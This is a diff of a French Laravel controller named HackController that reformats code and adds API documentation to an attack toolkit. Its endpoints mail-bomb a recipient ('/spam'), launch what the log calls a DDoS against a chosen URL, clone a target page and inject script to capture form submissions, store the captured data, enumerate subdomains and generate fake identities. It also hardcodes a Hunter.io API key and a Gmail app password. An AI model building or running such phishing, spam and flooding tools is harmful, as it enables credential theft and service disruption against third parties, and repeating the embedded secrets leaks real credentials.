@@ -1,6 +1,7 @@
 <?php
 
 namespace App\Http\Controllers;
+
 use App\Models\Log;
 use App\Models\Droit;
 use GuzzleHttp\Client;
@@ -20,70 +21,119 @@ class HackController extends Controller
     function checkRules($fonctionnalite_id, $current_role_id)
     {
         //verifier que l'utilisateur a le droit d'acceder à la fonctionnalité
-        try{
+        try {
             $droit = Droit::where('fonctionnalite_id', $fonctionnalite_id)->first();
-            if(!$droit){
+            if (!$droit) {
                 return true;
-            }
-            else
-            {
-                if($droit->role_id == $current_role_id){
+            } else {
+                if ($droit->role_id == $current_role_id) {
                     return true;
-                }
-                else if($droit->role_id < $current_role_id){
+                } else if ($droit->role_id < $current_role_id) {
                     return false;
                 }
             }
-        }
-        catch(\Exception $e){
-            return response()->json(['error' => 'Erreur lors de la vérification des droits '.$e], 500);
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Erreur lors de la vérification des droits ' . $e], 500);
         }
     }
 
+
+
+    /**
+     * @OA\Get(
+     *     path="/emailChecker/{email}",
+     *     summary="Vérifier un email via l'API Hunter.io",
+     *     description="Cette méthode permet de vérifier un email en utilisant l'API Hunter.io pour obtenir son statut et son score.",
+     *     tags={"HackController"},
+     *     @OA\Parameter(
+     *         name="email",
+     *         in="path",
+     *         description="Adresse email à vérifier",
+     *         required=true,
+     *         @OA\Schema(type="string", format="email")
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Email validé avec succès",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="email", type="string"),
+     *             @OA\Property(property="score", type="string"),
+     *             @OA\Property(property="status", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=400,
+     *         description="Email invalide ou erreur de l'API Hunter",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur serveur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     )
+     * )
+     */
     public function emailChecker($email)
     {
         $user = Auth::user();
-    
+
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(4, $user->role_id))
-        {
+        if (!$this->checkRules(4, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
-    
+
         try {
             $client = new Client();
             $url = 'https://api.hunter.io/v2/email-verifier?email=' . $email . '&api_key=a408bf05f8c0b21d39120be64204a5265b1db4a6';
-    
+
             // Valider le format de l'email avant d'envoyer la requête
             if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
                 return response()->json(['error' => 'Adresse email invalide'], 400);
             }
-    
+
             // Envoyer la requête GET à l'API Hunter.io
             $response = $client->request('GET', $url);
-    
+
             // Vérifier si la réponse est correcte (statut 200)
             if ($response->getStatusCode() !== 200) {
                 return response()->json(['error' => 'Erreur de l\'API Hunter: ' . $response->getStatusCode()], 500);
             }
-    
+
             // Décoder la réponse JSON
             $data = json_decode($response->getBody(), true);
-    
+
             if (isset($data['errors'])) {
                 // Gérer les erreurs spécifiques de l'API Hunter.io
                 return response()->json(['error' => 'Erreur API Hunter: ' . $data['errors'][0]['details']], 400);
             }
-    
+
             // Extraire les informations nécessaires
             $result = [
                 'email' => $data['data']['email'] ?? null,
                 'score' => isset($data['data']['score']) ? $data['data']['score'] . '%' : null,
                 'status' => $data['data']['status'] ?? null,
             ];
-    
+
             // Enregistrer le log de l'utilisateur
             try {
                 Log::create([
@@ -94,10 +144,9 @@ class HackController extends Controller
             } catch (\Exception $e) {
                 return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
             }
-    
+
             // Retourner les informations extraites
-            return response()->json($result);   
-    
+            return response()->json($result);
         } catch (RequestException $e) {
             if ($e->hasResponse()) {
                 // Gérer les erreurs HTTP spécifiques
@@ -105,30 +154,79 @@ class HackController extends Controller
                 $errorMessage = $e->getResponse()->getBody()->getContents();
                 return response()->json(['error' => 'Erreur API Hunter: ' . $statusCode . ' - ' . $errorMessage], $statusCode);
             }
-    
+
             // Autres erreurs de requête
             return response()->json(['error' => 'Erreur de connexion à l\'API: ' . $e->getMessage()], 500);
         } catch (\Exception $e) {
             return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
         }
     }
-    
 
-    function envoyerEmail(Request $request) {
+
+    /**
+     * @OA\Post(
+     *     path="/spam",
+     *     summary="Envoyer des emails en masse",
+     *     description="Cette méthode permet d'envoyer un ou plusieurs emails à un destinataire spécifié.",
+     *     tags={"HackController"},
+     *     @OA\RequestBody(
+     *         required=true,
+     *         @OA\JsonContent(
+     *             required={"destinataire", "objet", "message", "nombreEmail"},
+     *             @OA\Property(property="destinataire", type="string", format="email"),
+     *             @OA\Property(property="objet", type="string"),
+     *             @OA\Property(property="message", type="string"),
+     *             @OA\Property(property="nombreEmail", type="integer")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Emails envoyés avec succès"
+     *     ),
+     *     @OA\Response(
+     *         response=400,
+     *         description="Requête invalide",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur serveur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     )
+     * )
+     */
+    function envoyerEmail(Request $request)
+    {
 
         $user = Auth::user();
-    
+
         if (!$user) {
             // Si l'utilisateur n'est pas authentifié, renvoyer une réponse avec une erreur 401
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(5, $user->role_id))
-        {
+        if (!$this->checkRules(5, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
-        try{
-
+        try {
         } catch (\Exception $e) {
             // Gérer les erreurs liées à la création du log
             return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
@@ -144,27 +242,25 @@ class HackController extends Controller
             $mail->Password   = 'qtsi ypwe sfph jbbb';        // Ton mot de passe ou App Password
             $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
             $mail->Port       = 587;                       // Port TLS pour Gmail
-    
+
             // Destinataire
             $mail->setFrom('berthet.robinson@gmail.com', 'robi');  // Adresse email et nom de l'expéditeur
             $mail->addAddress($request->destinataire);                    // Ajouter un destinataire
-    
+
             // Contenu de l'email
             $mail->isHTML(true);                                 // Format HTML
             $mail->Subject = $request->objet;                             // Sujet de l'email
             $mail->Body    = $request->message;                           // Contenu du message
-            
-            for($i= 0; $i < $request->nombreEmail; $i++)
-            {
+
+            for ($i = 0; $i < $request->nombreEmail; $i++) {
                 // Envoi de l'email
                 $mail->send();
-
             }
 
             Log::create([
                 'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                 'fonctionnalite_id' => 5,       // ID de la fonctionnalité (connexion)
-                'description_action' => "envoi de ".$request->nombreEmail." email(s) à ".$request->destinataire  // Description de l'action
+                'description_action' => "envoi de " . $request->nombreEmail . " email(s) à " . $request->destinataire  // Description de l'action
             ]);
 
             return true;
@@ -175,6 +271,56 @@ class HackController extends Controller
         }
     }
 
+    /**
+     * @OA\Post(
+     *     path="/check-password",
+     *     summary="Vérifier si un mot de passe est commun",
+     *     description="Cette méthode permet de vérifier si le mot de passe fourni existe dans une liste de mots de passe courants.",
+     *     tags={"HackController"},
+     *     @OA\RequestBody(
+     *         required=true,
+     *         @OA\JsonContent(
+     *             required={"password"},
+     *             @OA\Property(property="password", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Résultat de la vérification du mot de passe",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="exists", type="boolean")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=400,
+     *         description="Mot de passe manquant ou mal formaté",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur serveur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     )
+     * )
+     */
     public function checkPassword(Request $request)
     {
         // Vérifier que l'utilisateur est authentifié
@@ -182,8 +328,7 @@ class HackController extends Controller
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(7, $user->role_id))
-        {
+        if (!$this->checkRules(7, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
@@ -192,7 +337,7 @@ class HackController extends Controller
             'password' => 'required|string',
         ]);
 
-            
+
         // Récupérer le mot de passe depuis la requête
         $password = $request->password;
         // URL du fichier texte brut sur GitHub
@@ -212,7 +357,7 @@ class HackController extends Controller
             Log::create([
                 'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                 'fonctionnalite_id' => 7,       // ID de la fonctionnalité (connexion)
-                'description_action' => "password checking sur le pwd :".$request->password
+                'description_action' => "password checking sur le pwd :" . $request->password
             ]);
             // Retourner une réponse JSON avec 'true' ou 'false'
             return response()->json(['exists' => $isPasswordInList]);
@@ -221,8 +366,43 @@ class HackController extends Controller
             return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
         }
     }
-    
 
+    /**
+     * @OA\Get(
+     *     path="/passwordGenerator",
+     *     summary="Générer un mot de passe aléatoire",
+     *     description="Cette méthode permet de générer un mot de passe aléatoire pour l'utilisateur.",
+     *     tags={"HackController"},
+     *     @OA\Response(
+     *         response=200,
+     *         description="Mot de passe généré avec succès",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="password", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur serveur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     )
+     * )
+     */
     public function generatePassword()
     {
 
@@ -234,8 +414,7 @@ class HackController extends Controller
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(8, $user->role_id))
-        {
+        if (!$this->checkRules(8, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
@@ -252,8 +431,49 @@ class HackController extends Controller
         // Retourner le mot de passe généré
         return response()->json(['password' => $password]);
     }
-    
-    
+
+
+    /**
+     * @OA\Get(
+     *     path="/subdomains/{domain}",
+     *     summary="Récupérer les sous-domaines d'un domaine",
+     *     description="Cette méthode permet de récupérer les sous-domaines d'un domaine en utilisant l'API SecurityTrails.",
+     *     tags={"HackController"},
+     *     @OA\Parameter(
+     *         name="domain",
+     *         in="path",
+     *         description="Nom du domaine",
+     *         required=true,
+     *         @OA\Schema(type="string")
+     *     ),
+     *     @OA\Response(
+     *         response=200,
+     *         description="Liste des sous-domaines récupérée avec succès",
+     *         @OA\JsonContent(type="array", items=@OA\Items(type="string"))
+     *     ),
+     *     @OA\Response(
+     *         response=401,
+     *         description="Utilisateur non authentifié",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=403,
+     *         description="Accès interdit selon les règles de l'utilisateur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     ),
+     *     @OA\Response(
+     *         response=500,
+     *         description="Erreur serveur",
+     *         @OA\JsonContent(
+     *             @OA\Property(property="error", type="string")
+     *         )
+     *     )
+     * )
+     */
     public function getSubdomains($domain)
     {
         // Définis ta clé d'API SecurityTrails ici ou dans le fichier .env
@@ -264,8 +484,7 @@ class HackController extends Controller
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(9, $user->role_id))
-        {
+        if (!$this->checkRules(9, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
@@ -276,7 +495,7 @@ class HackController extends Controller
 
         // Effectue la requête GET
         $response = Http::withHeaders([
-            'APIKEY' => $apiKey 
+            'APIKEY' => $apiKey
         ])->get($url);
 
 
@@ -287,7 +506,7 @@ class HackController extends Controller
                 Log::create([
                     'utilisateur_id' => $user->id,
                     'fonctionnalite_id' => 9, // ID de la fonctionnalité
-                    'description_action' => "recuperation des sous-domaines de :".$domain
+                    'description_action' => "recuperation des sous-domaines de :" . $domain
                 ]);
             } catch (\Exception $e) {
                 return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
@@ -311,8 +530,7 @@ class HackController extends Controller
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
-        if(!$this->checkRules(11, $user->role_id))
-        {
+        if (!$this->checkRules(11, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
         // Valider les données d'entrée
@@ -329,7 +547,7 @@ class HackController extends Controller
             Log::create([
                 'utilisateur_id' => $user->id,
                 'fonctionnalite_id' => 11, // ID de la fonctionnalité
-                'description_action' => "attaque ddos sur :".$url." avec ".$count." requêtes"
+                'description_action' => "attaque ddos sur :" . $url . " avec " . $count . " requêtes"
             ]);
         } catch (\Exception $e) {
             return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
@@ -364,8 +582,7 @@ class HackController extends Controller
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
 
-        if(!$this->checkRules(10, $user->role_id))
-        {
+        if (!$this->checkRules(10, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
         // Créer une instance de Faker
@@ -384,7 +601,7 @@ class HackController extends Controller
             Log::create([
                 'utilisateur_id' => $user->id,
                 'fonctionnalite_id' => 10, // ID de la fonctionnalité
-                'description_action' => "generation d'une identité fictive : ".$fakeIdentity['name']
+                'description_action' => "generation d'une identité fictive : " . $fakeIdentity['name']
             ]);
         } catch (\Exception $e) {
             return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
@@ -397,46 +614,45 @@ class HackController extends Controller
     {
         // Vérifier que l'utilisateur est authentifié
         $user = Auth::user();
-    
+
         if (!$user) {
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
 
-        if(!$this->checkRules(12, $user->role_id))
-        {
+        if (!$this->checkRules(12, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
-    
+
         // Valider que l'adresse est fournie et qu'elle est une URL valide
         $request->validate([
             'adresse' => 'required|url',
         ]);
-    
+
         // Récupérer l'adresse depuis la requête
         $url = $request->adresse;
-    
+
         try {
             // Effectuer une requête GET vers l'adresse donnée
             $response = Http::get($url);
-    
+
             if ($response->failed()) {
                 return response()->json(['error' => 'Impossible de récupérer le contenu de la page'], 500);
             }
-    
+
             // Récupérer le contenu HTML de la page
             $htmlContent = $response->body();
-    
+
             // Loguer l'action
             Log::create([
                 'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                 'fonctionnalite_id' => 12,      // ID de la fonctionnalité (récupération HTML)
                 'description_action' => "phishing pour le site : $url",
             ]);
-    
+
             // Vérifier et attribuer un ID au formulaire si nécessaire
             $matches = [];
             preg_match('/<form([^>]*)(id="([^"]+)")?([^>]*)>/', $htmlContent, $matches);
-    
+
             if (empty($matches[2])) {
                 // Si aucun id n'est trouvé, générer un ID
                 $htmlContent = preg_replace('/<form([^>]*)>/', '<form id="form-1"$1>', $htmlContent, 1);
@@ -445,7 +661,7 @@ class HackController extends Controller
                 // Si un id est trouvé, l'extraire
                 $formId = $matches[3];
             }
-    
+
             // Script JS à injecter
             $script = <<<SCRIPT
     <script>
@@ -491,12 +707,12 @@ class HackController extends Controller
         });
     </script>
     SCRIPT;
-    
+
             // Injecter le script avant </body>
             if (strpos($htmlContent, '</body>') !== false) {
                 $htmlContent = str_replace('</body>', $script . '</body>', $htmlContent);
             }
-    
+
             // Formater le HTML (optionnel)
             if (extension_loaded('tidy')) {
                 $tidy = new \tidy();
@@ -507,7 +723,7 @@ class HackController extends Controller
                 ];
                 $htmlContent = $tidy->repairString($htmlContent, $config, 'utf8');
             }
-    
+
             // Retourner le HTML modifié
             return response($htmlContent)->header('Content-Type', 'text/html');
         } catch (\Exception $e) {
@@ -515,7 +731,7 @@ class HackController extends Controller
             return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
         }
     }
-    
+
     public function getDataFromPhishing(Request $request)
     {
 
@@ -531,7 +747,7 @@ class HackController extends Controller
                 'utilisateur_id' => null, // L'ID de l'utilisateur
                 'fonctionnalite_id' => 13,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
                 'description_action' => 'Enregistrement de données : ' . json_encode($request->data), // Enregistrer les données sous forme de texte
-            ]); 
+            ]);
 
             // Retourner une réponse JSON confirmant l'enregistrement
             return response()->json(['success' => 'Données enregistrées avec succès'], 200);
@@ -550,12 +766,11 @@ class HackController extends Controller
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
 
-        if(!$this->checkRules(15, $user->role_id))
-        {
+        if (!$this->checkRules(15, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
-        
+
 
         $response = Http::get('https://thispersondoesnotexist.com');
 
@@ -570,8 +785,6 @@ class HackController extends Controller
         }
 
         return response($response->body())->header('Content-Type', 'image/jpeg');
-
-
     }
 
 
@@ -584,15 +797,14 @@ class HackController extends Controller
             return response()->json(['error' => 'Utilisateur non authentifié'], 401);
         }
 
-        if(!$this->checkRules(14, $user->role_id))
-        {
+        if (!$this->checkRules(14, $user->role_id)) {
             return response()->json(['error' => 'Interdis d\'accéder à la ressource.'], 403);
         }
 
         $apiKey = env('SERP_API_KEY'); // Récupérer la clé API
 
         $client = new Client(); // Créer un client HTTP
-    
+
         $url = "https://serpapi.com/search";
 
         try {
@@ -602,7 +814,7 @@ class HackController extends Controller
                     'api_key' => $apiKey   // Clé API
                 ]
             ]);
-    
+
             // Récupérer et décoder la réponse JSON
             $result = json_decode($response->getBody(), true);
 
@@ -612,8 +824,8 @@ class HackController extends Controller
                     'utilisateur_id' => $user->id, // L'ID de l'utilisateur
                     'fonctionnalite_id' => 14,      // ID de la fonctionnalité associée (à personnaliser selon votre logique)
                     'description_action' => "Recuperation de données sur: $request->search", // Enregistrer les données sous forme de texte
-                ]); 
-    
+                ]);
+
                 // Retourner une réponse JSON confirmant l'enregistrement
                 return response()->json(['success' => 'Données enregistrées avec succès'], 200);
             } catch (\Exception $e) {
@@ -622,11 +834,9 @@ class HackController extends Controller
             }
 
             return $result;
-    
         } catch (\Exception $e) {
             // Gestion des erreurs
             return ['error' => $e->getMessage()];
         }
     }
-    
 }
